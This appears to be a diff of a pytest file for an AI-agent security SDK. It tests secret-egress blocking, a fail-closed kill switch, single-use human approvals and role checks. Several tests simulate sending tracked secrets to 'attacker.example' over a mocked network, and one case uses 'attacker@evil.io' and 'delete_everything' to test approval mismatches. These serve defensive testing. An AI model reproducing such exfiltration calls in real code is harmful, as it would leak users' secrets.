@@ -13,7 +13,7 @@ import time
 
 import pytest
 
-KEYS = {"key-a": "org-a"}
+KEYS = {"key-a": "org-a", "key-b": "org-b"}
 SPAN = {
     "trace_id": "t1",
     "span_id": "s1",
@@ -276,7 +276,7 @@ def test_verifier_is_initialised_when_public_key_given(signer, monkeypatch):
 
 def test_verifier_from_environment_with_escaped_newlines(signer, monkeypatch):
     monkeypatch.setenv(
-        "AGENTGUARD_PUBLIC_KEY", signer.public_key_pem().replace("\n", "\n")
+        "AGENTGUARD_PUBLIC_KEY", signer.public_key_pem().replace("\n", "\\n")
     )
     assert _guard()._verifier is not None
 
@@ -443,8 +443,8 @@ def test_audit_checkpoint_signature_is_not_a_valid_runtime_decision(
 
     log = _audit_log(tmp_path, signer, monkeypatch)
     _log(log, 1)
-    with open(tmp_path / "audit.jsonl") as f:
-        line = json.loads(f.readline())
+    with open(tmp_path / "audit.jsonl") as fh:
+        line = json.loads(fh.readline())
     payload = json.loads(line["signature"])
     assert "expires_at" not in payload
     v = DecisionVerifier(signer.public_key_pem())
@@ -489,9 +489,7 @@ def test_audit_persistence_failure_can_block(tmp_path, signer, monkeypatch):
         _log(log, 1)
 
 
-def test_audit_anchor_reports_whether_it_is_independent(
-    tmp_path, signer, monkeypatch
-):
+def test_audit_anchor_reports_whether_it_is_independent(tmp_path, signer, monkeypatch):
     log = _audit_log(tmp_path, signer, monkeypatch)
     _log(log, 2)
 
@@ -505,3 +503,405 @@ def test_audit_anchor_reports_whether_it_is_independent(
     b = log.publish_anchor()
     assert b["independent"] is True and "file" in b["published_to"]
     assert str(b["head_hash"]) in anchor_file.read_text()
+
+
+# ── 6. Auto-instrumentation : multi-agents, Session, matrice d'egress ───────
+
+
+@pytest.fixture
+def instrumented(monkeypatch):
+    """Active l'auto-instrumentation avec un réseau factice (aucun trafic réel)."""
+    import requests
+
+    from agentguard import auto_instrument as ai
+
+    sent = []
+
+    def fake_send(self, request, **kw):
+        sent.append(request.url)
+        resp = requests.Response()
+        resp.status_code = 200
+        resp._content = b"{}"
+        return resp
+
+    monkeypatch.setattr(requests.Session, "send", fake_send)
+    ai.set_taint_tracker(None)
+    ai.enable_auto_instrumentation()
+    yield ai, sent
+    ai.disable_auto_instrumentation()
+    ai.set_taint_tracker(None)
+
+
+def _tracked(secret):
+    from agentguard.taint import FlowTracker, TaintLevel
+
+    ft = FlowTracker()
+    ft.track(secret, level=TaintLevel.SECRET)
+    return ft
+
+
+def test_second_agent_does_not_unprotect_the_first(instrumented):
+    import requests
+
+    from agentguard.models import SecurityException
+
+    ai, sent = instrumented
+    secret_a, secret_b = _secrets(2)
+    ta, tb = _tracked(secret_a), _tracked(secret_b)
+    ai.set_taint_tracker(ta, excluded_urls=("http://collector-a",))
+    ai.set_taint_tracker(tb, excluded_urls=("http://collector-b",))  # n'écrase plus A
+
+    with pytest.raises(SecurityException):
+        requests.post("https://attacker.example/x", json={"d": secret_a})
+    with pytest.raises(SecurityException):
+        requests.post("https://attacker.example/x", json={"d": secret_b})
+    assert sent == []
+
+
+def test_collector_exemption_is_per_agent(instrumented):
+    import requests
+
+    from agentguard.models import SecurityException
+
+    ai, sent = instrumented
+    secret_a, secret_b = _secrets(2)
+    ai.set_taint_tracker(_tracked(secret_a), excluded_urls=("http://collector-a",))
+    ai.set_taint_tracker(_tracked(secret_b), excluded_urls=("http://collector-b",))
+
+    # Le secret de A vers SON collector reste exempté (pas de deadlock)...
+    requests.post("http://collector-a/span", json={"d": secret_a})
+    # ...mais le secret de B vers le collector de A est bloqué.
+    with pytest.raises(SecurityException):
+        requests.post("http://collector-a/span", json={"d": secret_b})
+    assert sent == ["http://collector-a/span"]
+
+
+def test_requests_session_is_intercepted(instrumented):
+    import requests
+
+    from agentguard.models import SecurityException
+
+    ai, sent = instrumented
+    secret = _secrets(1)[0]
+    ai.set_taint_tracker(_tracked(secret))
+
+    session = requests.Session()
+    with pytest.raises(SecurityException):
+        session.post("https://attacker.example/collect", json={"data": secret})
+    with pytest.raises(SecurityException):
+        session.request("POST", "https://attacker.example/c", data={"k": secret})
+    assert sent == []
+
+    session.post("https://api.example/ok", json={"data": "hello"})
+    assert sent == ["https://api.example/ok"]
+
+
+def test_module_call_is_checked_only_once(instrumented):
+    import requests
+
+    from agentguard.taint import FlowTracker
+
+    ai, _ = instrumented
+
+    class Counting(FlowTracker):
+        calls = 0
+
+        def level_in(self, params):
+            Counting.calls += 1
+            return super().level_in(params)
+
+    ai.set_taint_tracker(Counting())
+    requests.post("https://api.example/ok", json={"a": 1})
+    assert Counting.calls == 1
+
+
+def test_saturated_tracker_does_not_block_other_agents_telemetry(instrumented):
+    import requests
+
+    from agentguard.models import SecurityException
+    from agentguard.taint import FlowTracker, TaintLevel
+
+    ai, sent = instrumented
+    saturated = FlowTracker()
+    for v in _secrets(520):
+        saturated.track(v, level=TaintLevel.SECRET)
+    assert saturated.saturated
+    clean = FlowTracker()
+    ai.set_taint_tracker(saturated, excluded_urls=("http://collector-1",))
+    ai.set_taint_tracker(clean, excluded_urls=("http://collector-2",))
+
+    # Télémétrie de l'agent 2 vers SON collector : jamais bloquée par le plancher
+    # fail-closed de l'agent 1.
+    requests.post("http://collector-2/span", json={"x": "ok"})
+    # Un envoi vers un tiers reste bloqué (fail-closed).
+    with pytest.raises(SecurityException):
+        requests.post("https://third.example/x", json={"x": "ok"})
+    assert sent == ["http://collector-2/span"]
+
+
+def test_egress_decision_matrix(monkeypatch):
+    from agentguard.auto_instrument import egress_decision
+    from agentguard.taint import TaintLevel as L
+
+    monkeypatch.delenv("AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL", raising=False)
+    assert [egress_decision(x) for x in (L.PUBLIC, L.INTERNAL, L.CONFIDENTIAL)] == [
+        "allow"
+    ] * 3
+    assert [egress_decision(x) for x in (L.SECRET, L.UNTRUSTED, L.MALICIOUS)] == [
+        "block"
+    ] * 3
+    monkeypatch.setenv("AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL", "true")
+    assert egress_decision(L.CONFIDENTIAL) == "block"
+
+
+# ── 7. Kill switch : statut périmé = fail-closed ────────────────────────────
+
+
+def test_stale_status_blocks_agent_unless_fail_open(monkeypatch):
+    from agentguard.models import AgentStatusStaleException
+    from agentguard.sdk import AgentGuard
+
+    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "60")
+    monkeypatch.delenv("AGENTGUARD_FAIL_OPEN", raising=False)
+    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")
+
+    g._check_status_fresh(time.time() - 5)  # frais : OK
+    with pytest.raises(AgentStatusStaleException):
+        g._check_status_fresh(time.time() - 3600)
+
+    g.fail_open = True
+    g._check_status_fresh(time.time() - 3600)  # politique explicite : OK
+
+
+def test_stale_status_is_a_disconnect_exception_subclass():
+    from agentguard.models import AgentDisconnectedException, AgentStatusStaleException
+
+    assert issubclass(AgentStatusStaleException, AgentDisconnectedException)
+
+
+def test_fast_path_uses_last_successful_status_age(monkeypatch):
+    from agentguard.background import Snapshot
+    from agentguard.models import AgentStatusStaleException
+    from agentguard.sdk import AgentGuard
+
+    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "60")
+    monkeypatch.delenv("AGENTGUARD_FAIL_OPEN", raising=False)
+    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")
+
+    class FakePoller:
+        def __init__(self, ok_at):
+            self.ok_at = ok_at
+
+        def snapshot(self):
+            return Snapshot(conn_state="connected", status_ok_at=self.ok_at)
+
+    monkeypatch.setattr(g, "_ensure_poller", lambda: FakePoller(time.time() - 5))
+    g._ensure_connected_fast()  # statut récent : OK
+
+    monkeypatch.setattr(g, "_ensure_poller", lambda: FakePoller(time.time() - 999))
+    with pytest.raises(AgentStatusStaleException):
+        g._ensure_connected_fast()
+
+
+def test_status_check_can_be_disabled(monkeypatch):
+    from agentguard.sdk import AgentGuard
+
+    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "0")
+    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")
+    g._check_status_fresh(0.0)
+
+
+# ── 8. Approbations à usage unique ──────────────────────────────────────────
+
+ARGS = {"to": "j@x.io", "n": 2}
+
+
+def _approve_one(c, api, mp, approval_id="u1", agent="bot", params=None):
+    c.post(
+        "/api/approvals",
+        headers=hdr(agent),
+        json={
+            "approval_id": approval_id,
+            "tool_name": "send_email",
+            "params": ARGS if params is None else params,
+        },
+    )
+    _as_human(api, mp, "admin")
+    assert (
+        c.post(
+            f"/api/approvals/{approval_id}/approve", headers={"X-API-Key": "key-a"}
+        ).status_code
+        == 200
+    )
+
+
+def _consume(
+    c, approval_id="u1", agent="bot", tool="send_email", args=None, key="key-a"
+):
+    from agentguard.signing import params_digest
+
+    return c.post(
+        f"/api/approvals/{approval_id}/consume",
+        headers={"X-API-Key": key, "X-Agent-Id": agent},
+        json={
+            "tool_name": tool,
+            "args_sha256": params_digest(ARGS if args is None else args),
+        },
+    )
+
+
+def test_approval_is_single_use(app_client):
+    _app, c, api, mp = app_client
+    _approve_one(c, api, mp)
+
+    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
+    assert status["status"] == "approved" and status["consumed"] is False
+
+    assert _consume(c).status_code == 200
+    again = _consume(c)
+    assert again.status_code == 409 and again.get_json()["error"] == "already_consumed"
+
+    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
+    assert status["consumed"] is True
+
+
+@pytest.mark.parametrize(
+    "kwargs,reason",
+    [
+        ({"tool": "delete_everything"}, "tool_mismatch"),
+        ({"args": {"to": "attacker@evil.io", "n": 2}}, "arguments_mismatch"),
+        ({"agent": "another-agent"}, "agent_mismatch"),
+    ],
+)
+def test_approval_cannot_be_used_for_another_action(app_client, kwargs, reason):
+    _app, c, api, mp = app_client
+    _approve_one(c, api, mp)
+    r = _consume(c, **kwargs)
+    assert r.status_code == 409 and r.get_json()["error"] == reason
+    # Une tentative refusée ne consomme rien : l'action légitime passe encore.
+    assert _consume(c).status_code == 200
+
+
+def test_unapproved_or_rejected_request_cannot_be_consumed(app_client):
+    _app, c, api, mp = app_client
+    c.post(
+        "/api/approvals",
+        headers=hdr("bot"),
+        json={"approval_id": "u2", "tool_name": "send_email", "params": ARGS},
+    )
+    r = _consume(c, approval_id="u2")
+    assert r.status_code == 409 and r.get_json()["error"] == "not_approved"
+
+    _as_human(api, mp, "admin")
+    c.post("/api/approvals/u2/reject", headers={"X-API-Key": "key-a"})
+    assert _consume(c, approval_id="u2").status_code == 409
+
+
+def test_same_request_after_consumption_needs_a_new_decision(app_client):
+    _app, c, api, mp = app_client
+    _approve_one(c, api, mp)
+    assert _consume(c).status_code == 200
+
+    # L'agent redemande la même action : repart en attente, plus d'accès gratuit.
+    r = c.post(
+        "/api/approvals",
+        headers=hdr("bot"),
+        json={"approval_id": "u1", "tool_name": "send_email", "params": ARGS},
+    )
+    assert r.status_code == 201
+    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
+    assert status["status"] == "pending" and status["consumed"] is False
+    assert _consume(c).status_code == 409
+
+
+def test_concurrent_consumption_has_a_single_winner(app_client):
+    import threading
+
+    app, c, api, mp = app_client
+    _approve_one(c, api, mp)
+    results = []
+
+    def attempt():
+        with app.test_client() as cc:
+            results.append(_consume(cc).status_code)
+
+    threads = [threading.Thread(target=attempt) for _ in range(8)]
+    [t.start() for t in threads]
+    [t.join() for t in threads]
+    assert sorted(results).count(200) == 1
+    assert results.count(409) == 7
+
+
+def test_approval_id_collision_across_orgs_is_not_reported_as_success(app_client):
+    _app, c, _api, _mp = app_client
+    body = {"approval_id": "same-id", "tool_name": "x", "params": {}}
+    assert c.post("/api/approvals", headers=hdr("bot"), json=body).status_code == 201
+    other = c.post(
+        "/api/approvals",
+        headers={"X-API-Key": "key-b", "X-Agent-Id": "bot"},
+        json=body,
+    )
+    assert other.status_code == 409
+    assert other.get_json()["error"] == "approval_id_conflict"
+
+
+def test_approval_ids_are_scoped_by_api_key():
+    from agentguard.sdk import AgentGuard
+
+    a = AgentGuard(collector_url="http://x.invalid", api_key="key-a", agent_id="bot")
+    b = AgentGuard(collector_url="http://x.invalid", api_key="key-b", agent_id="bot")
+    assert a.approval_id_for("send_email", ARGS) != b.approval_id_for(
+        "send_email", ARGS
+    )
+    assert a.approval_id_for("send_email", ARGS) == a.approval_id_for(
+        "send_email", ARGS
+    )
+
+
+# ── 9. Rôles sur la configuration de sécurité ───────────────────────────────
+
+
+@pytest.mark.parametrize("role", ["viewer", "auditor"])
+def test_read_only_roles_cannot_change_security_configuration(app_client, role):
+    _app, c, api, mp = app_client
+    _as_human(api, mp, role)
+    k = {"X-API-Key": "key-a"}
+    calls = [
+        c.put("/api/budgets/bot", headers=k, json={"monthly_limit_usd": 1}),
+        c.delete("/api/budgets/bot", headers=k),
+        c.post("/api/policy-rules", headers=k, json={}),
+        c.patch("/api/policy-rules/r1", headers=k, json={}),
+        c.delete("/api/policy-rules/r1", headers=k),
+        c.post("/api/alert-destinations", headers=k, json={}),
+        c.delete("/api/alert-destinations/d1", headers=k),
+        c.put("/api/agents/bot/mode", headers=k, json={"mode": "shadow"}),
+    ]
+    assert [r.status_code for r in calls] == [403] * len(calls)
+
+
+def test_admin_passes_the_role_gate_on_configuration(app_client):
+    _app, c, api, mp = app_client
+    _as_human(api, mp, "admin")
+    r = c.delete("/api/policy-rules/does-not-exist", headers={"X-API-Key": "key-a"})
+    assert r.status_code != 403 and r.status_code != 401
+
+
+def test_agentguard_unregisters_its_tracker_when_released(monkeypatch):
+    import gc
+
+    from agentguard import auto_instrument as ai
+    from agentguard.sdk import AgentGuard
+
+    monkeypatch.setenv("AGENTGUARD_TAINT_ENABLED", "true")
+    ai.set_taint_tracker(None)
+    g = AgentGuard(collector_url="http://x.invalid", api_key="k", agent_id="a")
+    try:
+        g.auto_instrument()
+        assert g._flow in ai._trackers
+        flow = g._flow
+        del g
+        gc.collect()
+        assert flow not in ai._trackers
+    finally:
+        ai.disable_auto_instrumentation()
+        ai.set_taint_tracker(None)
